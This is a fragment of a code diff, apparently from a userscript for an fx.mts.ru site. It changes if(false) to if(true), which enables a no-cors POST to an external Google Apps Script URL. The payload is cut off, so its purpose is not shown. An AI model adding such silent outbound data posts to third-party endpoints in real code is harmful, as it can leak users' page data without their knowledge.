@@ -3619,7 +3619,7 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 			a.click();
 			a.remove();
 			*/
-			if(false){
+			if(true){
 				fetch('https://script.google.com/macros/s/AKfycbxl1S7H0iftlsBt8Tx-gL0zE-qwbwSN4TsUBpPqdIe9uMWtwgHfNGXb/exec',{
 					'method':'POST',
 					'mode':'no-cors',
